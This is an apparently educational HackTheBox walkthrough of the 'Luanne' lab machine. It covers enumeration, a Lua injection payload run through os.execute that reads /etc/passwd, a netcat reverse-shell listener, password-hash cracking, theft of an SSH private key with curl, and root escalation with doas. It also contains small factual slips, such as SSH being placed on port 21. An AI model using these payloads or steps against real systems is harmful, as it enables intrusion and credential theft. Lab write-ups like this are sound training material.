@@ -1,0 +1,134 @@
+<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
+<div class="post-content">
+            <div class="post-cats">
+                <span class="cat-links"><a href="https://www.hackingarticles.in/category/ctf-challenges/" rel="category tag">CTF Challenges</a>, <a href="https://www.hackingarticles.in/category/ctf-challenges/hackthebox/" rel="category tag">HackTheBox</a></span>            </div>
+            <h1 class="post-title entry-title">Luanne HackTheBox Walkthrough</h1>            <div class="post-date">
+                                    <div class="entry-meta">
+                        <span class="posted-on"><a href="https://www.hackingarticles.in/luanne-hackthebox-walkthrough/" rel="bookmark"><time class="entry-date published" datetime="2021-06-12T17:14:33+00:00">June 12, 2021</time><time class="updated" datetime="2025-06-20T17:49:45+00:00">June 20, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
+                            </div>
+
+            <div class="content post-excerpt entry-content clearfix">
+                <p><span style="color: #000000;">Today we are going to crack a machine called the Luanne. It was created by <span style="color: #0000ff;"><strong>polarbearer</strong></span>. This is a Capture the Flag type of challenge. This machine is hosted on HackTheBox. Let’s get cracking!</span></p>
+<h3><span style="color: #800000;"><strong>Penetration Testing Methodology</strong></span></h3>
+<ul>
+<li><span style="color: #000000;"><strong>Network Scanning</strong></span>
+<ul>
+<li><span style="color: #000000;">Nmap Scan</span></li>
+</ul>
+</li>
+<li><span style="color: #000000;"><strong>Enumeration</strong></span>
+<ul>
+<li><span style="color: #000000;">Enumerating HTTP Service</span></li>
+<li><span style="color: #000000;">Directory Bruteforce using Gobuster</span></li>
+<li><span style="color: #000000;">Fuzzing Web API</span></li>
+</ul>
+</li>
+<li><span style="color: #000000;"><strong>Exploitation</strong></span>
+<ul>
+<li><span style="color: #000000;">Injecting the Lua RCE</span></li>
+<li><span style="color: #000000;">Getting the Shell</span></li>
+<li><span style="color: #000000;">Extracting webapi_user hash</span></li>
+<li><span style="color: #000000;">Enumerating using netstat</span></li>
+<li><span style="color: #000000;">Decrypting hash using John the Ripper</span></li>
+<li><span style="color: #000000;">Enumerating user r.michaels</span></li>
+<li><span style="color: #000000;">Getting SSH Private Key</span></li>
+<li><span style="color: #000000;">Connecting via SSH as r.michaels</span></li>
+<li><span style="color: #000000;">Reading User Flag</span></li>
+</ul>
+</li>
+<li><span style="color: #000000;"><strong>Privilege Escalation </strong></span>
+<ul>
+<li><span style="color: #000000;">Enumerating Backups</span></li>
+<li><span style="color: #000000;">Decoding Backups</span></li>
+<li><span style="color: #000000;">Extracting webapi_user hash</span></li>
+<li><span style="color: #000000;">Decrypting hash using John the Ripper</span></li>
+<li><span style="color: #000000;">Getting Root Shell</span></li>
+<li><span style="color: #000000;">Reading the Root Flag</span></li>
+</ul>
+</li>
+</ul>
+<h3><span style="color: #800000;"><strong>Walkthrough</strong></span></h3>
+<p><span style="color: #000000;">To Attack any machine, we need the IP Address. Machine hosted on HackTheBox has a static IP Address.</span></p>
+<p><span style="color: #000000;"><strong>IP Address assigned: 10.129.147.195</strong></span></p>
+<h3><span style="color: #800000;"><strong>Network Scanning</strong></span></h3>
+<p><span style="color: #000000;">Now that we have the IP Address. We need to enumerate open ports on the machine. For this, we will be running a Nmap scan.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">nmap -A 10.129.147.195</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-DqSB8hwx-1o/YMTnPaY8XQI/AAAAAAAAwaU/8Bd7PUrNtd4-yWqMT569nFjsPjl5IaXWACLcBGAsYHQ/s16000/1.png"/></span></p>
+<p><span style="color: #000000;">There is quite some information that we can gain from the Nmap scan. It includes that three services are running on the target machine. It consists of an SSH service on port 21, followed by the HTTP service on port 80, and finally another HTTP service on port 9001.</span></p>
+<h3><span style="color: #800000;"><strong>Enumeration</strong></span></h3>
+<p><span style="color: #000000;">Since we are lacking any credentials that can be used to log in via SSH service, we start with the HTTP service on port 80. There isn’t much to go on since we are blocked by an authentication panel. We tried a bunch of common usernames and passwords but were unable to get across it.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">http://10.129.147.195</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-s1AKQ_AbB54/YMTnY8-M41I/AAAAAAAAwaY/HrPfPOO7stoyaOAwVXO6plPINhRTOIp3wCLcBGAsYHQ/s16000/2.png"/></span></p>
+<p><span style="color: #000000;">Another thing that we can do at this stage is performing a directory Bruteforce. We are going to use gobuster for this particular task. We used a bunch of different dictionaries and finally were able to get robots.txt as shown in the image below.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">gobuster dir --url http://10.129.147.195/ --wordlist /usr/share/dirbuster/wordlists/directory-list-lowercase-2.3-small.txt</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-BNNkMnJMKxU/YMTnghn7qFI/AAAAAAAAwag/FIAIkIAPDvkiPDJnyDezjnIQliB8XTeYQCLcBGAsYHQ/s16000/3.png"/></span></p>
+<p><span style="color: #000000;">To take a look at the contents of robots.txt, we used the web browser. We see that there is a directory by the name of weather in the Disallow section. There is a note that tells us that it is returning a Not Found error but is still able to “harvest” cities. It doesn’t make any sense at this moment.       </span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">http://10.129.147.195/robots.txt</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-EW6J0GQfqWU/YMTnof8rdeI/AAAAAAAAwak/ETghVesxNLk7mlAgWtEh8TzVvjsyBVDTQCLcBGAsYHQ/s16000/4.png"/></span></p>
+<p><span style="color: #000000;">Since we have the gobuster at our disposal, we thought why not let it run on the weather directory. It gave us another directory by the name of the forecast. Maybe it is a weather forecasting application. We will see along the way.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">gobuster dir --url http://10.129.147.195/weather/ --wordlist /usr/share/dirbuster/wordlists/directory-list-lowercase-2.3-small.txt</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-u5PoRPgspbw/YMTn8NE6jUI/AAAAAAAAwa0/ToMR_j3hyvUkrzAbHU1F3bL-gUcmnaz4wCLcBGAsYHQ/s16000/5.png"/></span></p>
+<h3><span style="color: #800000;">Lua Injection and Shell Access</span></h3>
+<p><span style="color: #000000;">Upon opening the forecast page on our web browser, we see that it is a JSON response. It is an error message about the fact that we are missing the city. It tells us to use the city variable with the value list to get the list of all the available cities.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">10.129.147.195/weather/forecast</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-l4GlLt0wxE4/YMToAIiQ6NI/AAAAAAAAwa4/Y_bDj0RxrKIkFo79dNtbGDS-GS_Ka0MggCLcBGAsYHQ/s16000/6.png"/></span></p>
+<p><span style="color: #000000;">We added the city parameter into the URL with the value list and we have it. It is a small list consisting of various cities in the UK.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">10.129.147.195/weather/forecast?city=list</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-9QP7cKk4ZkI/YMToPyoUmDI/AAAAAAAAwbA/2ap6aDm1XyEmWWAqYLIGaz8oUky0_g52QCLcBGAsYHQ/s16000/7.png"/></span></p>
+<p><span style="color: #000000;">After messing around with the parameter and values we added a quote mark at the end of London to see what kind of response that we get. It gave a Lua error. The good news was that it gave us a directory path along with the error message.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">10.129.147.195/weather/forecast?city=London'</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-UEeUojW45Jo/YMToUYjvYLI/AAAAAAAAwbE/rkV0hsCLvTY-QFbCgNG4nFLXReUPzarzwCLcBGAsYHQ/s16000/8.png"/></span></p>
+<p><span style="color: #000000;">Since we broke the query with a quote, we tried to fix it and insert some parameters in the hope to get an injection attack out of it. After trying a bunch of different options, we were able to get some success with Remote Command Execution with the os.execute. We have demonstrated this by reading the /etc/passed file using the cat command.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">10.129.147.195/weather/forecast?city=London’)os.execute("cat /etc/passwd")--</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-LKtoFz20U_0/YMTok2B9D9I/AAAAAAAAwbM/YyeL2C5zdEgeUv-7PHN1sq3_xQ3XwHoEgCLcBGAsYHQ/s16000/9.png"/></span></p>
+<p><span style="color: #000000;">Then to get a shell out of the remote command execution we have, we thought it is best if encode the reverse shellcode in URL encoding. We achieved this using the website we found urlencoder.org. Ensure to enter the IP Address of the VPN with a port on your attacker’s machine.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-6tR9Rq-yKUg/YMTopWd2h3I/AAAAAAAAwbU/NvM1Qrhx5XECWCGz6GLKDWPm5ZaeO14ggCLcBGAsYHQ/s16000/10.png"/></span></p>
+<p><span style="color: #000000;">Now, we entered the port number that we want to receive the shell as 1234. So before executing the command, we ran a Netcat listener on the port to receive the reverse shell. Followed by that we entered the URL encoded reverse shell command as shown in the image.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">10.129.147.195/weather/forecast?city=London’)os.execute(“URL Encoded Reverse Shell Code”)--</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-OV3boFYzz7w/YMTowRUx-HI/AAAAAAAAwbY/V52gu0o_rOMewBG8sx6JaFbyPjSXDIE7wCLcBGAsYHQ/s16000/11.png"/></span></p>
+<h3><span style="color: #800000;">Privilege Escalation</span></h3>
+<p><span style="color: #000000;">As soon as the command was executed, we were able to get a shell on the target machine. We used the ls command to find some clues and we were able to get the .htpasswd file. Upon reading the file we get that there is a user by the name of webapi_user and we found its hashed password. Another task we did after getting the shell was to check for network connections. We found that there is an internal service running on port 3001.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">nc -lvp 1234
+ls -la
+cat .htpasswd
+netstat -ant</pre>
+<p><span style="color: #000000;"><strong> <img decoding="async" src="https://1.bp.blogspot.com/-DLr_TjmbNck/YMTo1YSHCdI/AAAAAAAAwbg/7rpIuJyxW0ocUHOdpCcFocBAelV-Z7P9gCLcBGAsYHQ/s16000/12.png"/></strong></span></p>
+<p><span style="color: #000000;">We took the hash we discovered and put it into a file called luannehash. Then to crack it, we applied John the Ripper to the hash. We discovered that MD5 encryption was used. I am the best after the hash cracked. We now know the webapi_user user’s password.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">john -wordlist=/usr/share/wordlists/rockyou.txt luannehash
+iamthebest</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-pZ-XGRojLD0/YMTpActjIKI/AAAAAAAAwbo/qL-j1k4x0rk2MMNAG1kEIK8rIJeDr4yiACLcBGAsYHQ/s16000/13.png"/></span></p>
+<h4><span style="color: #000000;">Lateral Movement and SSH Key Compromise</span></h4>
+<p><span style="color: #000000;">We attempted to establish an SSH connection to the target computer using the credentials we discovered. Our attempt to log in was unsuccessful.We thus returned to our shells and made an effort to further enumerate. Another user with the name r.michael was discovered. After we got into the user’s directory, we found an SSH private key that we can use to log in. We use the curl command to read the contents of the id_rsa file.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">curl --user webapi_user:iamthebest 127.0.0.1:3001/~r.michaels/id_rsa</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-lPl4aa8awA0/YMTpEsbvmdI/AAAAAAAAwbs/qd1Yeyynl8odnzDMulH4a_F9eGw6j33tgCLcBGAsYHQ/s16000/14.png"/></span></p>
+<p><span style="color: #000000;">We were able to use SSH to log in as an R. Michaels user on the target machine after copying and pasting the key on our Kali computer and granting the necessary permissions. The NetBSD message appeared to greet us. We obtained the user flag by listing the files in the current directory once more. The backups directory was also located. Once we navigated through the backups directory, we discovered a backup file called devel_backup-2020-09-16.tar.gz.enc.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">ssh -I key r.michaels@10.129.147.195
+ls -la
+cat user.txt
+cd backups
+ls -la</pre>
+<p><span style="color: #000000;"><strong> <img decoding="async" src="https://1.bp.blogspot.com/-P-WKtq8QZQg/YMTpOQQJ52I/AAAAAAAAwb0/MXc9JzYHbQM8HDO-KJeF0daRQSYBtejfwCLcBGAsYHQ/s16000/50.png"/></strong></span></p>
+<h4><span style="color: #000000;">Final Privilege Escalation to Root</span></h4>
+<p><span style="color: #000000;">As it seemed to be encoded, we used the netpgp command to decrypt the backup file into the raj.tar.gz file. Next, we tried to decompress the raj file that we just encoded into the tmp directory. Upon close inspection, we see that it is quite similar to the www directory that we visited earlier. It had a .htpasswd file as well. Upon reading the file we found that the hash seemed to be a bit different than the first time.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">netpgp --decrypt devel_backup-2020-09-16.tar.gz.enc --output=/tmp/raj.tar.gz
+cd /tmp
+tar -xf raj.tar.gz
+cd devel-2020-09-16/
+ls
+cd www
+ls -la
+cat .htpasswd</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-B_ocQ7wcy1c/YMTpT-jmA4I/AAAAAAAAwb8/LGId_tq2rfgro3wYNhlUNpWPmGGXII4-QCLcBGAsYHQ/s16000/51.png"/></span></p>
+<p><span style="color: #000000;">We took the hash back to the Kali Linux and used the John the Ripper to decode it as before. This time we used the name hash. The password came out to be a little bear as shown in the image below.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">john --wordlist=/usr/share/wordlists/rockyou.txt hash
+littlebear</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-T77GhOyoYhU/YMTpYirSH6I/AAAAAAAAwcE/AokTnowvU3kvaaCYWjKTPoy9L57tQJn9ACLcBGAsYHQ/s16000/52.png"/></span></p>
+<p><span style="color: #000000;">Using the password we had just cracked, we logged in as su using the doas command. Elevated access was granted to us. To locate the last flag and finish the machine, we navigated to the root directory.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">doas su
+littlebear
+cd /root
+cat root.txt</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-dOs3LJAQBiM/YMTpcG7kL-I/AAAAAAAAwcI/p_54wfSeLJUw7V9aoiqnNUYEA0NsAIt-QCLcBGAsYHQ/s16000/53.png"/></span></p>
+<p><span style="color: #000000;">Thank you for giving your precious time to read this walkthrough. I hope you have enjoyed and learned something new today. If you want to read more HTB Write-ups. Follow this </span><strong><a href="https://www.hackingarticles.in/category/ctf-challenges/hackthebox/">Link.</a></strong> <span style="color: #000000;">Happy Hacking!</span></p>
+<p><span style="color: #000000;"><strong>Author: Pavandeep Singh</strong> is a Technical Writer, Researcher, and Penetration Tester. Contact on <span style="color: #0000ff;"><strong>Twitter</strong> </span>and <span style="color: #0000ff;"><strong><a style="color: #0000ff;" href="https://www.linkedin.com/in/pavan2318/">LinkedIn</a></strong></span></span></p>
+<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
